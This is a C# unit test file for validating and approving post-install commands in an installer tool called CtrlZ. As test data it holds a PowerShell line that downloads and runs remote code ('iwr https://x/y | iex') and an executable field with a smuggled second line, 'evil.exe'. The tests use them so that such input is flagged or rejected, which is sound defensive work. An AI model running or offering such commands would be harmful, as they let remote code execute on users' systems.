// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (c) 2026 iam-groot1

using CtrlZ.Core.Install;
using CtrlZ.Core.Models;

namespace CtrlZ.Core.Tests;

public sealed class PostInstallCommandFormTests : IDisposable
{
    private readonly string _folder = Path.Combine(Path.GetTempPath(), "ctrlz-form-" + Guid.NewGuid().ToString("n"));

    public void Dispose()
    {
        if (Directory.Exists(_folder))
        {
            Directory.Delete(_folder, recursive: true);
        }
    }

    private static PostInstallCommandInput Input(
        string exe = "reg.exe", string args = "import\nsettings.reg", string dir = "", string timeout = "60",
        bool elevated = false, bool enabled = true) => new(exe, args, dir, timeout, elevated, enabled);

    [Fact]
    public void Blank_form_means_no_command()
    {
        var result = PostInstallCommandForm.Parse(Input(exe: "  ", args: "\n \n"));

        Assert.True(result.IsValid);
        Assert.Null(result.Command);
    }

    [Fact]
    public void Arguments_are_one_per_line_and_never_joined()
    {
        var result = PostInstallCommandForm.Parse(Input(args: " import \r\n\r\n C:\\a b\\settings.reg \n"));

        Assert.True(result.IsValid);
        Assert.Equal(new[] { "import", @"C:\a b\settings.reg" }, result.Command!.Arguments);
        Assert.Equal("reg.exe", result.Command.Executable);
    }

    [Fact]
    public void Elevation_is_off_by_default()
    {
        Assert.False(PostInstallCommandForm.Empty.RequiresElevation);
        Assert.False(PostInstallCommandForm.Parse(Input()).Command!.RequiresElevation);
    }

    [Theory]
    [InlineData("", "import", "", "60", "Enter the program to run")]
    [InlineData("reg.exe", "import", "", "abc", "Timeout must be a whole number")]
    [InlineData("reg.exe", "import", "", "4", "Timeout must be a whole number")]
    [InlineData("reg.exe", "import", "", "601", "Timeout must be a whole number")]
    [InlineData("reg.exe", "import", "relative\\dir", "60", "Working directory must be a full path")]
    [InlineData("reg.exe\nevil.exe", "import", "", "60", "one line")]
    public void Invalid_input_is_rejected(string exe, string args, string dir, string timeout, string expected)
    {
        var result = PostInstallCommandForm.Parse(Input(exe, args, dir, timeout));

        Assert.False(result.IsValid);
        Assert.Contains(expected, result.Error);
    }

    [Fact]
    public void Round_trip_keeps_every_field()
    {
        var original = new PostInstallCommand
        {
            Executable = "reg.exe",
            Arguments = ["import", "a.reg"],
            WorkingDirectory = @"C:\Tools",
            TimeoutSeconds = 120,
            RequiresElevation = true,
            Enabled = true
        };

        var parsed = PostInstallCommandForm.Parse(PostInstallCommandForm.From(original)).Command!;

        Assert.Equal(PostInstallApprovalStore.HashOf(original), PostInstallApprovalStore.HashOf(parsed));
        Assert.Equal(120, parsed.TimeoutSeconds);
        Assert.True(parsed.Enabled);
    }

    [Fact]
    public void Editing_an_approved_command_drops_its_approval()
    {
        var approvals = new PostInstallApprovalStore(Path.Combine(_folder, "approvals.json"));
        var original = PostInstallCommandForm.Parse(Input()).Command!;
        approvals.Approve("p1", original);

        var edited = PostInstallCommandForm.Parse(Input(args: "import\nother.reg")).Command!;

        Assert.True(approvals.IsApproved("p1", original));
        Assert.False(approvals.IsApproved("p1", edited));
    }

    [Theory]
    [InlineData(false, false, false)]   // safe new command
    [InlineData(true, false, true)]     // risky new command
    [InlineData(true, true, false)]     // risky but unchanged: already confirmed when it was saved
    public void Risky_save_needs_a_second_confirmation(bool risky, bool unchanged, bool expected)
    {
        var after = risky
            ? new PostInstallCommand { Executable = "powershell.exe", Arguments = ["-c", "iwr https://x/y | iex"] }
            : new PostInstallCommand { Executable = "reg.exe", Arguments = ["import", "a.reg"] };
        var before = unchanged ? after.Clone() : null;

        Assert.Equal(expected, PostInstallCommandForm.NeedsRiskConfirmation(before, after));
    }

    [Fact]
    public void Removing_a_command_needs_no_risk_confirmation()
    {
        var before = new PostInstallCommand { Executable = "powershell.exe", Arguments = ["-c", "iwr https://x/y | iex"] };

        Assert.False(PostInstallCommandForm.NeedsRiskConfirmation(before, null));
    }

    [Theory]
    [InlineData(ProfileOrigin.Local, true)]
    [InlineData(ProfileOrigin.Imported, false)]
    [InlineData(ProfileOrigin.Unknown, false)]
    public void Only_local_profiles_may_edit_commands(ProfileOrigin origin, bool expected)
    {
        Assert.Equal(expected, PostInstallCommandForm.CanEdit(origin));
    }
}
